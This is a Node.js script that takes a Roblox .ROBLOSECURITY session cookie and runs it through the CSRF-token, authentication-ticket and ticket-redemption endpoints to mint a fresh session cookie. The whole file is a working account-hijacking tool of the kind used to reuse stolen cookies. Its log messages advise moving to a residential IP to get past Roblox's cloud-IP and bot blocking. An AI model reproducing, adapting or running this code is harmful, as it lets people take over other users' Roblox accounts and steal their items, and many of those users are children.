const axios = require('axios');

class Bypass {
    /**
     * @param {string} cookie - The .ROBLOSECURITY cookie to bypass
     */
    constructor(cookie) {
        this.cookie = cookie;
        this.xcsrf_token = null;
        this.rbx_authentication_ticket = null;
        this.attempts = {
            csrf: 3,
            ticket: 3,
            redeem: 3
        };
    }

    /**
     * Main entry point - starts the bypass process
     * @returns {Promise<{success: boolean, result: string|null, error: string|null, details: object}>}
     */
    async startProcess() {
        console.log("🚀 Starting Roblox session bypass process...");
        console.log(`📝 Cookie length: ${this.cookie?.length || 0} characters`);
        
        if (!this.cookie || !this.cookie.includes('_|WARNING')) {
            console.warn("⚠️  Cookie may be invalid - missing expected format markers");
        }

        try {
            // Step 1: Get CSRF Token
            console.log("\n🔑 Step 1: Fetching X-CSRF-TOKEN...");
            this.xcsrf_token = await this.getCsrfToken();
            
            if (!this.xcsrf_token) {
                return {
                    success: false,
                    result: null,
                    error: "Failed to obtain X-CSRF-TOKEN after multiple attempts",
                    details: {
                        step: "csrf_token",
                        attempts: this.attempts.csrf,
                        cookieValid: !!this.cookie
                    }
                };
            }
            
            console.log(`✅ CSRF Token obtained: ${this.xcsrf_token.substring(0, 20)}...`);

            // Step 2: Get Authentication Ticket
            console.log("\n🎫 Step 2: Generating RBX Authentication Ticket...");
            this.rbx_authentication_ticket = await this.getRbxAuthenticationTicket();
            
            if (!this.rbx_authentication_ticket) {
                return {
                    success: false,
                    result: null,
                    error: "Failed to obtain RBX Authentication Ticket",
                    details: {
                        step: "auth_ticket",
                        csrfTokenExists: !!this.xcsrf_token,
                        csrfTokenPreview: this.xcsrf_token ? `${this.xcsrf_token.substring(0, 15)}...` : null
                    }
                };
            }
            
            console.log(`✅ Auth Ticket obtained: ${this.rbx_authentication_ticket.substring(0, 30)}...`);

            // Step 3: Redeem Ticket for new cookie
            console.log("\n🔄 Step 3: Redeeming Authentication Ticket...");
            const setCookie = await this.getSetCookie();
            
            if (!setCookie) {
                return {
                    success: false,
                    result: null,
                    error: "Failed to redeem authentication ticket",
                    details: {
                        step: "redeem_ticket",
                        ticketExists: !!this.rbx_authentication_ticket,
                        ticketLength: this.rbx_authentication_ticket?.length || 0
                    }
                };
            }

            console.log("✅ SUCCESS: Bypass completed!");
            console.log(`📊 New cookie length: ${setCookie.length} characters`);
            
            // Validate the new cookie
            if (!setCookie.includes('_|WARNING')) {
                console.warn("⚠️  New cookie may be invalid - missing expected format markers");
            }

            return {
                success: true,
                result: setCookie,
                error: null,
                details: {
                    steps_completed: 3,
                    original_cookie_length: this.cookie?.length || 0,
                    new_cookie_length: setCookie.length,
                    csrf_token_length: this.xcsrf_token?.length || 0,
                    auth_ticket_length: this.rbx_authentication_ticket?.length || 0,
                    timestamp: new Date().toISOString()
                }
            };

        } catch (error) {
            console.error("💥 CRITICAL ERROR in bypass process:", error.message);
            
            return {
                success: false,
                result: null,
                error: error.message,
                details: {
                    step: error.step || "unknown",
                    csrf_token_obtained: !!this.xcsrf_token,
                    auth_ticket_obtained: !!this.rbx_authentication_ticket,
                    stack_trace: error.stack
                }
            };
        }
    }

    /**
     * Fetch CSRF token with retry logic
     * @returns {Promise<string|null>}
     */
    async getCsrfToken() {
        const maxAttempts = this.attempts.csrf;
        
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            console.log(`\n🔄 CSRF Attempt ${attempt}/${maxAttempts}...`);
            
            try {
                const response = await axios.post(
                    "https://auth.roblox.com/v2/logout",
                    {}, // Empty body
                    {
                        headers: {
                            "Cookie": `.ROBLOSECURITY=${this.cookie}`,
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                        },
                        validateStatus: function (status) {
                            // Accept all status codes, we'll handle them manually
                            return true;
                        }
                    }
                );

                console.log(`📡 Response Status: ${response.status}`);
                console.log(`📡 Response Headers:`, Object.keys(response.headers).join(', '));

                // Check if we got a CSRF token in the headers
                const csrfToken = response.headers['x-csrf-token'];
                
                if (csrfToken) {
                    console.log(`✅ CSRF Token found in headers (${csrfToken.length} chars)`);
                    return csrfToken;
                }

                // Handle different status codes
                if (response.status === 200) {
                    console.warn("⚠️  Logout succeeded without CSRF token - unusual behavior");
                    console.log("📋 Response data:", JSON.stringify(response.data, null, 2));
                } else if (response.status === 401 || response.status === 403) {
                    console.warn(`🔒 Authentication issue (${response.status})`);
                    
                    // Check for specific error messages
                    if (response.data && response.data.errors) {
                        const errors = response.data.errors;
                        errors.forEach(err => {
                            console.log(`📋 Roblox Error: ${err.code} - ${err.message}`);
                            if (err.code === 0) {
                                console.warn("⚠️  This usually indicates an invalid or expired cookie");
                            }
                        });
                    }
                    
                    // Check for cloud IP block
                    if (response.data && response.data.includes("cloud") || 
                        response.data && response.data.includes("proxy") ||
                        response.data && response.data.includes("suspicious")) {
                        console.error("☁️  CLOUD IP DETECTED: Roblox may be blocking cloud/VPS IP addresses");
                        console.error("💡 Try running from a residential IP or different location");
                    }
                } else {
                    console.warn(`⚠️  Unexpected status code: ${response.status}`);
                }

                // Wait before retry (exponential backoff)
                if (attempt < maxAttempts) {
                    const waitTime = attempt * 1000; // 1s, 2s, 3s...
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }

            } catch (error) {
                this.handleRequestError(error, "getCsrfToken", attempt, maxAttempts);
                
                // Wait before retry
                if (attempt < maxAttempts) {
                    const waitTime = attempt * 1000;
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
        }

        console.error(`❌ Failed to get CSRF token after ${maxAttempts} attempts`);
        return null;
    }

    /**
     * Get RBX Authentication Ticket
     * @returns {Promise<string|null>}
     */
    async getRbxAuthenticationTicket() {
        if (!this.xcsrf_token) {
            console.error("❌ Cannot get auth ticket without CSRF token");
            return null;
        }

        const maxAttempts = this.attempts.ticket;
        
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            console.log(`\n🎫 Auth Ticket Attempt ${attempt}/${maxAttempts}...`);
            
            try {
                const response = await axios.post(
                    "https://auth.roblox.com/v1/authentication-ticket",
                    {}, // Empty body
                    {
                        headers: {
                            "x-csrf-token": this.xcsrf_token,
                            "rbxauthenticationnegotiation": "1",
                            "referer": "https://www.roblox.com/camel",
                            "Content-Type": "application/json",
                            "Cookie": `.ROBLOSECURITY=${this.cookie}`,
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                        },
                        validateStatus: function (status) {
                            return true;
                        }
                    }
                );

                console.log(`📡 Response Status: ${response.status}`);
                
                // Extract ticket from headers
                const ticket = response.headers['rbx-authentication-ticket'];
                
                if (ticket) {
                    console.log(`✅ Auth Ticket obtained (${ticket.length} chars)`);
                    return ticket;
                }

                // Handle different status codes
                if (response.status === 200) {
                    console.warn("⚠️  Got 200 but no auth ticket in headers");
                    console.log("📋 Headers received:", Object.keys(response.headers).join(', '));
                } else if (response.status === 403) {
                    console.error("🔒 403 Forbidden - CSRF token may be invalid or expired");
                    
                    // Check response for more details
                    if (response.data && response.data.errors) {
                        response.data.errors.forEach(err => {
                            console.log(`📋 Roblox Error: ${err.code} - ${err.message}`);
                        });
                    }
                    
                    // Check for specific block messages
                    if (response.data && typeof response.data === 'string') {
                        if (response.data.includes("captcha") || response.data.includes("bot")) {
                            console.error("🤖 CAPTCHA/BOT DETECTION: Roblox may be requiring verification");
                        }
                    }
                } else if (response.status === 401) {
                    console.error("🔐 401 Unauthorized - Cookie is invalid or expired");
                } else {
                    console.warn(`⚠️  Unexpected status: ${response.status}`);
                    console.log("📋 Response data:", JSON.stringify(response.data, null, 2));
                }

                // Wait before retry
                if (attempt < maxAttempts) {
                    const waitTime = attempt * 1000;
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }

            } catch (error) {
                this.handleRequestError(error, "getRbxAuthenticationTicket", attempt, maxAttempts);
                
                // Wait before retry
                if (attempt < maxAttempts) {
                    const waitTime = attempt * 1000;
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
        }

        console.error(`❌ Failed to get auth ticket after ${maxAttempts} attempts`);
        return null;
    }

    /**
     * Redeem authentication ticket for new cookie
     * @returns {Promise<string|null>}
     */
    async getSetCookie() {
        if (!this.rbx_authentication_ticket) {
            console.error("❌ Cannot redeem without authentication ticket");
            return null;
        }

        const maxAttempts = this.attempts.redeem;
        
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            console.log(`\n🔄 Redeem Attempt ${attempt}/${maxAttempts}...`);
            
            try {
                const response = await axios.post(
                    "https://auth.roblox.com/v1/authentication-ticket/redeem",
                    {
                        authenticationTicket: this.rbx_authentication_ticket
                    },
                    {
                        headers: {
                            "rbxauthenticationnegotiation": "1",
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                        },
                        validateStatus: function (status) {
                            return true;
                        }
                    }
                );

                console.log(`📡 Response Status: ${response.status}`);
                
                // Check for set-cookie header
                const setCookieHeader = response.headers['set-cookie'];
                
                if (setCookieHeader) {
                    console.log(`📦 Set-Cookie header found (${setCookieHeader.length} chars)`);
                    
                    // Extract .ROBLOSECURITY cookie
                    const cookieMatch = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
                    
                    if (cookieMatch && cookieMatch[1]) {
                        console.log(`✅ New cookie extracted (${cookieMatch[1].length} chars)`);
                        return cookieMatch[1];
                    }
                    
                    // Alternative extraction method
                    const cookies = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
                    for (const cookieStr of cookies) {
                        if (cookieStr.includes('.ROBLOSECURITY')) {
                            const extracted = cookieStr.split('.ROBLOSECURITY=')[1]?.split(';')[0];
                            if (extracted) {
                                console.log(`✅ New cookie extracted via alternative method (${extracted.length} chars)`);
                                return extracted;
                            }
                        }
                    }
                }

                // Handle different status codes
                if (response.status === 200) {
                    console.warn("⚠️  Got 200 but no set-cookie header");
                    console.log("📋 Headers:", Object.keys(response.headers).join(', '));
                    
                    // Check for authentication errors in response
                    if (response.data && response.data.errors) {
                        response.data.errors.forEach(err => {
                            console.log(`📋 Roblox Error: ${err.code} - ${err.message}`);
                            if (err.code === 3) {
                                console.error("🔐 Authentication ticket is invalid or expired");
                            }
                        });
                    }
                } else if (response.status === 403) {
                    console.error("🔒 403 Forbidden - Authentication ticket rejected");
                    
                    // Check for cloud IP block
                    if (response.data && typeof response.data === 'string' && 
                        (response.data.includes("cloud") || response.data.includes("proxy"))) {
                        console.error("☁️  STRONG CLOUD IP DETECTION: Roblox is blocking this request");
                        console.error("💡 This IP/VPS is likely blacklisted by Roblox");
                    }
                } else {
                    console.warn(`⚠️  Unexpected status: ${response.status}`);
                    console.log("📋 Response data:", JSON.stringify(response.data, null, 2));
                }

                // Wait before retry
                if (attempt < maxAttempts) {
                    const waitTime = attempt * 1000;
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }

            } catch (error) {
                this.handleRequestError(error, "getSetCookie", attempt, maxAttempts);
                
                // Wait before retry
                if (attempt < maxAttempts) {
                    const waitTime = attempt * 1000;
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
        }

        console.error(`❌ Failed to redeem ticket after ${maxAttempts} attempts`);
        return null;
    }

    /**
     * Handle HTTP request errors with detailed logging
     * @param {Error} error - The error object
     * @param {string} step - Which step failed
     * @param {number} attempt - Current attempt number
     * @param {number} maxAttempts - Maximum attempts
     */
    handleRequestError(error, step, attempt, maxAttempts) {
        console.error(`\n💥 Error in ${step} (Attempt ${attempt}/${maxAttempts}):`);
        
        if (error.response) {
            // The request was made and the server responded with a status code
            console.error(`📡 Status: ${error.response.status}`);
            console.error(`📋 Headers:`, error.response.headers);
            
            if (error.response.data) {
                console.error(`📄 Response Data:`, 
                    typeof error.response.data === 'object' 
                        ? JSON.stringify(error.response.data, null, 2)
                        : error.response.data
                );
            }
            
            // Check for cloud IP indicators
            const responseData = error.response.data;
            if (responseData && typeof responseData === 'string') {
                const cloudIndicators = ['cloud', 'proxy', 'vpn', 'suspicious', 'bot', 'automated'];
                if (cloudIndicators.some(indicator => responseData.toLowerCase().includes(indicator))) {
                    console.error("☁️  CLOUD/VPN IP DETECTED IN ERROR RESPONSE");
                }
            }
            
        } else if (error.request) {
            // The request was made but no response was received
            console.error("📡 No response received - Network error");
            console.error("🔗 Request details:", error.request);
            
            // Check for DNS or connectivity issues
            if (error.code === 'ENOTFOUND') {
                console.error("🌐 DNS resolution failed - Check internet connection");
            } else if (error.code === 'ECONNREFUSED') {
                console.error("🚫 Connection refused - Roblox servers may be down");
            } else if (error.code === 'ETIMEDOUT') {
                console.error("⏰ Request timeout - Network latency or server issues");
            }
        } else {
            // Something happened in setting up the request
            console.error("⚙️  Setup error:", error.message);
        }
        
        console.error("🔧 Full error:", error.message);
    }

    /**
     * Configure retry attempts for different steps
     * @param {Object} config - Configuration object
     * @param {number} config.csrf - CSRF token attempts
     * @param {number} config.ticket - Auth ticket attempts
     * @param {number} config.redeem - Redeem attempts
     */
    configureAttempts(config) {
        if (config.csrf && config.csrf > 0) this.attempts.csrf = config.csrf;
        if (config.ticket && config.ticket > 0) this.attempts.ticket = config.ticket;
        if (config.redeem && config.redeem > 0) this.attempts.redeem = config.redeem;
        
        console.log("⚙️  Retry configuration updated:");
        console.log(`   CSRF attempts: ${this.attempts.csrf}`);
        console.log(`   Ticket attempts: ${this.attempts.ticket}`);
        console.log(`   Redeem attempts: ${this.attempts.redeem}`);
    }
}

/**
 * Utility function to validate a cookie
 * @param {string} cookie - Cookie to validate
 * @returns {Object} Validation result
 */
function validateCookie(cookie) {
    const result = {
        isValid: false,
        issues: [],
        warnings: [],
        details: {
            length: cookie?.length || 0,
            hasWarningMarker: false,
            hasSecureFlag: false,
            format: 'unknown'
        }
    };

    if (!cookie) {
        result.issues.push("Cookie is empty or null");
        return result;
    }

    if (cookie.length < 100) {
        result.issues.push(`Cookie is too short (${cookie.length} chars, expected ~400+)`);
    }

    if (cookie.includes('_|WARNING')) {
        result.details.hasWarningMarker = true;
        result.details.format = 'modern';
    } else {
        result.warnings.push("Cookie missing modern warning markers - may be old format");
    }

    if (cookie.includes('Secure')) {
        result.details.hasSecureFlag = true;
    }

    result.isValid = result.issues.length === 0;
    return result;
}

/**
 * Main execution function (if run directly)
 */
async function main() {
    const args = process.argv.slice(2);
    
    if (args.length === 0) {
        console.log("Usage: node bypass.js <ROBLOSECURITY_COOKIE>");
        console.log("\nExample:");
        console.log('  node bypass.js "_|WARNING:-DO-NOT-SHARE-THIS...your_cookie_here"');
        return;
    }

    const cookie = args[0];
    const validation = validateCookie(cookie);
    
    console.log("🔍 Cookie Validation Results:");
    console.log(`   Valid: ${validation.isValid ? '✅' : '❌'}`);
    console.log(`   Length: ${validation.details.length} characters`);
    console.log(`   Format: ${validation.details.format}`);
    
    if (validation.issues.length > 0) {
        console.log("\n❌ Issues found:");
        validation.issues.forEach(issue => console.log(`   - ${issue}`));
    }
    
    if (validation.warnings.length > 0) {
        console.log("\n⚠️  Warnings:");
        validation.warnings.forEach(warning => console.log(`   - ${warning}`));
    }

    console.log("\n" + "=".repeat(50));
    
    const bypass = new Bypass(cookie);
    
    // Optional: Configure retry attempts
    // bypass.configureAttempts({ csrf: 5, ticket: 3, redeem: 3 });
    
    const result = await bypass.startProcess();
    
    console.log("\n" + "=".repeat(50));
    console.log("📊 FINAL RESULTS:");
    console.log(`   Success: ${result.success ? '✅' : '❌'}`);
    
    if (result.success) {
        console.log(`   New Cookie: ${result.result.substring(0, 50)}...`);
        console.log(`   Length: ${result.result.length} characters`);
        
        // Save to file example
        // const fs = require('fs');
        // fs.writeFileSync('new_cookie.txt', result.result);
        // console.log("💾 Cookie saved to new_cookie.txt");
    } else {
        console.log(`   Error: ${result.error}`);
        console.log(`   Details:`, result.details);
    }
    
    return result;
}

// Export both the class and utility functions
module.exports = {
    Bypass,
    validateCookie,
    // Legacy function exports for compatibility
    generateAuthTicket: async function(roblosecurityCookie) {
        const bypass = new Bypass(roblosecurityCookie);
        await bypass.getCsrfToken();
        return await bypass.getRbxAuthenticationTicket();
    },
    redeemAuthTicket: async function(authTicket) {
        // Note: This requires creating a new Bypass instance with a dummy cookie
        const bypass = new Bypass('');
        bypass.rbx_authentication_ticket = authTicket;
        const newCookie = await bypass.getSetCookie();
        return {
            success: !!newCookie,
            refreshedCookie: newCookie,
            robloxDebugResponse: newCookie ? null : "Failed to redeem ticket"
        };
    }
};

// Run main if this file is executed directly
if (require.main === module) {
    main().catch(console.error);
}